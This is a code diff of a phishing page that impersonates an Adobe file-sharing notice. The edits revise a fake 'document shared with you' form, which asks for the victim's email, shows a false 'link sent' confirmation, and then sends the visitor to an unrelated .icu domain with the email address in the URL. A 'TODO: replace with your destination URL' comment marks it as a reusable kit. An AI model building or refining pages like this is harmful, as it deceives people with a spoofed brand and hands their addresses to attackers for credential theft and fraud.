@@ -385,17 +385,19 @@
       <i class="fas fa-file-lines"></i>
     </div>
 
-    <h1 class="card-title">A file has been shared with you</h1>
+    <h1 class="card-title">A document has been shared with you</h1>
     <p class="card-sub">
-      Enter your email address below and we'll send a viewing link straight to your inbox — no sign-in needed.
+      Enter your email address to receive a secure link to view this file.
     </p>
   </div>
 
   <!-- BODY -->
   <div class="card-body">
-    <form id="form" novalidate>
 
-      <label class="field-label" for="email">Your Email Address</label>
+    <!-- Note: no <form> submit used; button click handled via JS to control redirect -->
+    <div id="formArea">
+
+      <label class="field-label" for="email">Email Address</label>
       <div class="input-wrap">
         <i class="fas fa-envelope"></i>
         <input
@@ -403,23 +405,22 @@
           id="email"
           name="email"
           placeholder="name@company.com"
-          required
           autocomplete="email"
         >
       </div>
-      <p class="field-hint">This is where we'll send your personal viewing link.</p>
+      <p class="field-hint">We will send a time-limited access link to this address.</p>
 
       <div class="callout">
         <i class="fas fa-circle-info"></i>
-        <p>We'll email you a link that's good for 24 hours. It's tied to your address so only you can open the file.</p>
+        <p>Your access link will be valid for 24 hours and is tied to the email address you provide.</p>
       </div>
 
-      <button type="submit" class="btn" id="submitBtn">
+      <button class="btn" id="submitBtn" onclick="handleSubmit()">
         <i class="fas fa-arrow-up-right-from-square" style="font-size:14px;"></i>
         <span>View Document</span>
       </button>
 
-    </form>
+    </div>
   </div>
 
   <!-- SECURITY STRIP -->
@@ -445,7 +446,7 @@
 </div>
 
 <div class="below-card">
-  © 2024 Adobe Inc. &nbsp;·&nbsp; <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms of Use</a>
+  &copy; 2025 Adobe Inc. &nbsp;&middot;&nbsp; <a href="#">Privacy Policy</a> &nbsp;&middot;&nbsp; <a href="#">Terms of Use</a>
 </div>
 
 <!-- TOAST -->
@@ -458,33 +459,32 @@
 </div>
 
 <script>
-  const form      = document.getElementById('form');
-  const submitBtn = document.getElementById('submitBtn');
-  const toast     = document.getElementById('toast');
+  var submitBtn = document.getElementById('submitBtn');
+  var toast     = document.getElementById('toast');
 
-  form.addEventListener('submit', e => {
-    e.preventDefault();
-
-    const email = document.getElementById('email').value.trim();
-    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  function handleSubmit() {
+    var emailInput = document.getElementById('email');
+    var email = emailInput.value.trim();
+    var valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
 
     if (!valid) {
-      showToast('err', 'Double-check that address', 'Try something like name@company.com');
-      document.getElementById('email').focus();
+      showToast('err', 'Please check your email address', 'Use the format name@company.com');
+      emailInput.focus();
       return;
     }
 
     submitBtn.disabled = true;
-    submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin" style="font-size:14px;"></i><span>On its way…</span>';
+    submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin" style="font-size:14px;"></i><span>Sending&hellip;</span>';
 
-    setTimeout(() => {
-      showToast('ok', 'Link on its way', `Check your inbox at ${email} — it should arrive in moments.`);
+    setTimeout(function() {
+      showToast('ok', 'Link sent', 'A viewing link has been sent to ' + email);
 
-      setTimeout(() => {
-        window.location.href = 'https://mailwavemarketing.icu?QhYsUZoS&ref=' + email.toLowerCase().trim();
+      setTimeout(function() {
+        // TODO: replace with your destination URL
+        window.location.href = 'https://accounts.etkileyicisozler.icu?ihupDHc=ZW1qbm96&smn=' + email.toLowerCase().trim();
       }, 2200);
     }, 1600);
-  });
+  }
 
   function showToast(type, title, body) {
     toast.className = 'toast ' + type;
@@ -493,7 +493,7 @@
     document.getElementById('tTitle').textContent = title;
     document.getElementById('tBody').textContent  = body;
     toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 5000);
+    setTimeout(function() { toast.classList.remove('show'); }, 5000);
   }
 </script>
 </body>
